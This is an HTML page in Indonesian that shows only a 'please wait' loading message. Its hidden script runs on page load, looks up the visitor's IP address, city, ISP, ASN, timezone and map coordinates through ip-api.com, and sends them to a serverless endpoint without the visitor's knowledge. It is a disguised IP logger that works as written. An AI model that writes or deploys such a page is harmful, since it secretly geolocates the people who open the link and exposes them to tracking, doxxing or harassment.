<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3>Mohon tunggu...</h3>

  <script>
    async function getIP() {
      try {
        // ambil info IP dari ip-api
        const res = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
        const data = await res.json();

        if (data.status !== "success") {
          throw new Error(data.message || "Gagal ambil data");
        }

        // isi pesan
        const info = `
ğŸ“¡ *IP Terdeteksi*
ğŸŒ IP: ${data.query}
ğŸŒ Negara: ${data.country}
ğŸ™ Kota: ${data.city}, ${data.regionName} ${data.zip}
ğŸ›° ISP: ${data.isp}
ğŸ¢ Org: ${data.org}
âš¡ ASN: ${data.as}
âŒš Zona Waktu: ${data.timezone}
ğŸ“Œ Koordinat: ${data.lat}, ${data.lon}
ğŸ”— https://www.google.com/maps?q=${data.lat},${data.lon}
        `;

        // kirim ke serverless function Vercel
        const send = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: info })
        });

        const result = await send.json();
        console.log("Hasil API:", result);

      } catch (err) {
        console.error("Error:", err);
      }
    }

    getIP();
  </script>
</body>
</html>
